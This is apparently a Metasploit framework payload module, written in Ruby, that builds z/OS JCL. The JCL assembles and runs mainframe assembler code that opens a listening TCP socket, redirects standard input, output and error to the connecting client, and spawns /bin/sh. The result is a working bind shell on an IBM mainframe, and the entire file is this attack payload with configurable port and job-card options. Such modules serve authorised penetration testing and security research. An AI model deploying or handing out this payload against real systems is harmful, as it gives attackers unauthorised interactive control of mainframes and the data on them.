##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# This payload has no ebcdic<->ascii translator built in.
# Therefore it must use a shell which does, like mainframe_shell
#
# this payload will spawn a bind shell from z/os, when submitted
#  on the system as JCL to JES2
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/mainframe_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 10712
  include Msf::Payload::Single
  include Msf::Payload::Mainframe
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Z/OS (MVS) Command Shell, Bind TCP',
                     'Description'   => 'Provide JCL which creates a bind shell
                     This implmentation does not include ebcdic character translation,
                     so a client with translation capabilities is required.  MSF handles
                     this automatically.',
                     'Author'        => 'Bigendian Smalls',
                     'License'       => MSF_LICENSE,
                     'Platform'      => 'mainframe',
                     'Arch'          => ARCH_CMD,
                     'Handler'       => Msf::Handler::BindTcp,
                     'Session'       => Msf::Sessions::MainframeShell,
                     'PayloadType'   => 'cmd',
                     'RequiredCmd'   => 'jcl',
                     'Payload'       =>
    {
      'Offsets' => {},
      'Payload' => ''
    }))
    register_options(
      [
        # need these defaulted so we can manipulate them in command_string
        Opt::LHOST('0.0.0.0'),
        Opt::LPORT(32700),
        OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
        OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
        OptString.new('JCLASS', [true, "Job Class for JCL JOB card", "A"]),
        OptString.new('NOTIFY', [false, "Notify User for JCL JOB card", ""]),
        OptString.new('MSGCLASS', [true, "Message Class for JCL JOB card", "Z"]),
        OptString.new('MSGLEVEL', [true, "Message Level for JCL JOB card", "(0,0)"])
      ], self.class
    )
    register_advanced_options(
      [
        OptBool.new('NTFYUSR', [true, "Include NOTIFY Parm?", false]),
        OptString.new('JOBNAME', [true, "Job name for JCL JOB card", "DUMMY"])
      ],
      self.class
    )
  end

  ##
  # Construct Payload
  ##
  def generate
    super + command_string
  end

  ##
  # Setup replacement vars and populate payload
  ##
  def command_string
    if (datastore['JOBNAME'] == "DUMMY") && !datastore['FTPUSER'].nil?
      datastore['JOBNAME'] = (datastore['FTPUSER'] + "1").strip.upcase
    end
    lhost = Rex::Socket.resolv_nbo(datastore['LHOST'])
    lhost = lhost.unpack("H*")[0]
    lport = datastore['LPORT']
    lport = lport.to_s.to_i.to_s(16).rjust(4, '0')

    jcl_jobcard +
      "//**************************************/\n" \
      "//*  SPAWN BIND SHELL FOR MSF MODULE   */\n" \
      "//**************************************/\n" \
      "//*\n" \
      "//STEP1      EXEC PROC=ASMACLG,PARM.L=(CALL)\n" \
      "//L.SYSLIB   DD  DSN=SYS1.CSSLIB,DISP=SHR\n" \
      "//C.SYSIN    DD  *,DLM=ZZ\n" \
      "         TITLE  'Spawns Bind Shell'\n" \
      "SPAWNBND CSECT\n" \
      "SPAWNBND AMODE 31\n" \
      "SPAWNBND RMODE ANY\n" \
      "***********************************************************************\n" \
      "*        @SETUP registers and save areas                              *\n" \
      "***********************************************************************\n" \
      "         USING *,15\n" \
      "@SETUP0  B     @SETUP1\n" \
      "         DROP  15\n" \
      "         DS    0H                 # half word boundary\n" \
      "@SETUP1  STM   14,12,12(13)       # save our registers\n" \
      "         LR    2,13               # callers sa\n" \
      "         LR    8,15               # pgm base in R8\n" \
      "         USING @SETUP0,8          # R8 for base addressability\n" \
      "*************************************\n" \
      "* set up data area / addressability *\n" \
      "*************************************\n" \
      "         L     0,@DYNSIZE         # len of variable area\n" \
      "         GETMAIN RU,LV=(0)        # get data stg, len R0\n" \
      "         LR    13,1               # data address\n" \
      "         USING @DATA,13           # addressability for data area\n" \
      "         ST    2,@BACK            # store callers sa address\n" \
      "         ST    13,8(,2)           # store our data addr\n" \
      "         DS    0H                 # halfword boundaries\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1SOC set up socket - inline                               *\n" \
      "***********************************************************************\n" \
      "         CALL  BPX1SOC,                                                X\n" \
      "               (DOM,TYPE,PROTO,DIM,SRVFD,                              X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "*******************************\n" \
      "*  chk return code, 0 or exit *\n" \
      "*******************************\n" \
      "         LHI   15,2\n" \
      "         L     6,RTN_VAL\n" \
      "         CIB   6,0,7,EXITP        # R6 not 0? Time to exit\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1BND (bind) bind to local socket - inline                 *\n" \
      "***********************************************************************\n" \
      "         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\n" \
      "         MVI   SOCK_FAMILY,AF_INET          # family inet\n" \
      "         MVI   SOCK_LEN,SOCK#LEN            # len of socket\n" \
      "         MVC   SOCK_SIN_PORT,CONNSOCK       # port to bind to\n" \
      "         MVC   SOCK_SIN_ADDR,CONNADDR       # address to bind to\n" \
      "         CALL  BPX1BND,                                                X\n" \
      "               (SRVFD,SOCKLEN,SOCKADDR,                                X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "*******************************\n" \
      "*  chk return code, 0 or exit *\n" \
      "*******************************\n" \
      "         LHI   15,3\n" \
      "         L     6,RTN_VAL\n" \
      "         CIB   6,0,7,EXITP        # R6 not 0? Time to exit\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1LSN (listen) listen on local socket - inline             *\n" \
      "***********************************************************************\n" \
      "         CALL  BPX1LSN,                                                X\n" \
      "               (SRVFD,BACKLOG,                                         X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "*******************************\n" \
      "*  chk return code, 0 or exit *\n" \
      "*******************************\n" \
      "         LHI   15,4\n" \
      "         L     6,RTN_VAL\n" \
      "         CIB   6,0,7,EXITP        # R6 not 0? Time to exit\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1ACP (accept) accept socket connection - inline           *\n" \
      "***********************************************************************\n" \
      "         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct\n" \
      "         MVI   SOCK_FAMILY,AF_INET          # family inet\n" \
      "         MVI   SOCK_LEN,SOCK#LEN            # len of socket\n" \
      "         CALL  BPX1ACP,                                                X\n" \
      "               (SRVFD,CLILEN,CLISKT,                                   X\n" \
      "               CLIFD,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "*******************************\n" \
      "*  chk return code, 0 or exit *\n" \
      "*******************************\n" \
      "         LHI   15,5\n" \
      "         L     6,RTN_VAL\n" \
      "         CIB   6,0,7,EXITP        # R6 not 0? Time to exit\n" \
      "\n" \
      "*************************************************\n" \
      "* order of things to prep child pid             *\n" \
      "*  0) Dupe all 3 file desc of CLIFD             *\n" \
      "*  1) Dupe parent read fd to std input          *\n" \
      "*************************************************\n" \
      "*******************\n" \
      "*****  STDIN  *****\n" \
      "*******************\n" \
      "         CALL  BPX1FCT,                                                X\n" \
      "               (CLIFD,                                                 X\n" \
      "               =A(F_DUPFD2),                                           X\n" \
      "               =A(F_STDI),                                             X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "****************************************************\n" \
      "*  chk return code here anything but -1 is ok      *\n" \
      "****************************************************\n" \
      "         LHI   15,6               # exit code for this func\n" \
      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
      "         CIB   7,-1,8,EXITP       # r6 = -1 exit\n" \
      "\n" \
      "*******************\n" \
      "*****  STDOUT *****\n" \
      "*******************\n" \
      "         CALL  BPX1FCT,                                                X\n" \
      "               (CLIFD,                                                 X\n" \
      "               =A(F_DUPFD2),                                           X\n" \
      "               =A(F_STDO),                                             X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "****************************************************\n" \
      "*  chk return code here anything but -1 is ok      *\n" \
      "****************************************************\n" \
      "         LHI   15,7               # exit code for this func\n" \
      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
      "         CIB   7,-1,8,EXITP       # r6 = -1 exit\n" \
      "\n" \
      "*******************\n" \
      "*****  STDERR *****\n" \
      "*******************\n" \
      "         CALL  BPX1FCT,                                                X\n" \
      "               (CLIFD,                                                 X\n" \
      "               =A(F_DUPFD2),                                           X\n" \
      "               =A(F_STDE),                                             X\n" \
      "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "****************************************************\n" \
      "*  chk return code here anything but -1 is ok      *\n" \
      "****************************************************\n" \
      "         LHI   15,8               # exit code for this func\n" \
      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
      "         CIB   7,-1,8,EXITP       # r7 = -1 exit\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BP1SPN (SPAWN) execute shell '/bin/sh'                       *\n" \
      "***********************************************************************\n" \
      "         XC    INHE(INHE#LENGTH),INHE   # clear inhe structure\n" \
      "         XI    INHEFLAGS0,INHESETPGROUP\n" \
      "         SPACE ,\n" \
      "         MVC   INHEEYE,=C'INHE'\n" \
      "         LH    0,TLEN\n" \
      "         STH   0,INHELENGTH\n" \
      "         LH    0,TVER\n" \
      "         STH   0,INHEVERSION\n" \
      "         CALL  BPX1SPN,                                                X\n" \
      "               (EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,EXENVC,EXENVLL,     X\n" \
      "               EXENVL,FDCNT,FDLST,=A(INHE#LENGTH),INHE,RTN_VAL,        X\n" \
      "               RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
      "         LHI   15,9               # exit code for this func\n" \
      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
      "         L     6,RTN_COD\n" \
      "         L     5,RSN_COD\n" \
      "         CIB   7,-1,8,EXITP       # r7 = -1 exit\n" \
      "\n" \
      "****************************************************\n" \
      "* cleanup & exit preload R15 with exit code        *\n" \
      "****************************************************\n" \
      "         XR    15,15              # 4 FOR rc\n" \
      "EXITP    L     0,@DYNSIZE\n" \
      "         LR    1,13\n" \
      "         L     13,@BACK\n" \
      "         DROP  13\n" \
      "         FREEMAIN RU,LV=(0),A=(1) #free storage\n" \
      "         XR    15,15\n" \
      "         L     14,12(,13)         # load R14\n" \
      "         LM    0,12,20(13)        # load 0-12\n" \
      "         BSM   0,14               # branch to caller\n" \
      "\n" \
      "****************************************************\n" \
      "* Constants and Variables                          *\n" \
      "****************************************************\n" \
      "         DS    0F                 # constants full word boundary\n" \
      "F_STDI   EQU   0\n" \
      "F_STDO   EQU   1\n" \
      "F_STDE   EQU   2\n" \
      "*************************\n" \
      "* Socket conn variables *         # functions used by pgm\n" \
      "*************************\n" \
      "CONNSOCK DC    XL2'#{lport}'      # LPORT\n" \
      "CONNADDR DC    XL4'#{lhost}'      # LHOST\n" \
      "BACKLOG  DC    F'1'               # 1 byte backlog\n" \
      "DOM      DC    A(AF_INET)         # AF_INET = 2\n" \
      "TYPE     DC    A(SOCK#_STREAM)    # stream = 1\n" \
      "PROTO    DC    A(IPPROTO_IP)      # ip = 0\n" \
      "DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1\n" \
      "SOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)\n" \
      "CLILEN   DC    F'0'               # client sock len - don't care\n" \
      "CLISKT   DC    X'00'              # client socket struck - don't care\n" \
      "************************\n" \
      "* BPX1SPN vars *********\n" \
      "************************\n" \
      "EXCMD    DC    CL7'/bin/sh'       # command to exec\n" \
      "EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec\n" \
      "EXARGC   DC    F'1'               # num of arguments\n" \
      "EXARG1   DC    CL2'sh'            # arg 1 to exec\n" \
      "EXARG1L  DC    A(L'EXARG1)        # len of arg1\n" \
      "EXARGL   DC    A(EXARG1)          # addr of argument list\n" \
      "EXARGLL  DC    A(EXARG1L)         # addr of arg len list\n" \
      "EXENVC   DC    F'0'               # env var count\n" \
      "EXENVL   DC    F'0'               # env var arg list addr\n" \
      "EXENVLL  DC    F'0'               # env var arg len addr\n" \
      "FDCNT    DC    F'0'               # field count s/b 0\n" \
      "FDLST    DC    F'0'               # field list addr s/b 0\n" \
      "TVER     DC    AL2(INHE#VER)\n" \
      "TLEN     DC    AL2(INHE#LENGTH)\n" \
      "         SPACE ,\n" \
      "@DYNSIZE DC    A(@ENDYN-@DATA)\n" \
      "***************************\n" \
      "***** end of constants ****\n" \
      "***************************\n" \
      "@DATA    DSECT ,\n" \
      "         DS    0D\n" \
      "PLIST    DS    16A\n" \
      "RTN_VAL  DS    F                  # return value\n" \
      "RTN_COD  DS    F                  # return code\n" \
      "RSN_COD  DS    F                  # reason code\n" \
      "CLIFD    DS    F                  # client fd\n" \
      "SRVFD    DS    F                  # server fd\n" \
      "@BACK    DS    A\n" \
      "*\n" \
      "         BPXYSOCK   LIST=NO,DSECT=NO\n" \
      "         BPXYFCTL   LIST=NO,DSECT=NO\n" \
      "         BPXYINHE   LIST=NO,DSECT=NO\n" \
      "@ENDYN   EQU   *\n" \
      "@DATA#LEN EQU  *-@DATA\n" \
      "         BPXYCONS   LIST=YES\n" \
      "         END   SPAWNBND\n" \
      "ZZ\n" \
      "//*\n"
  end
end
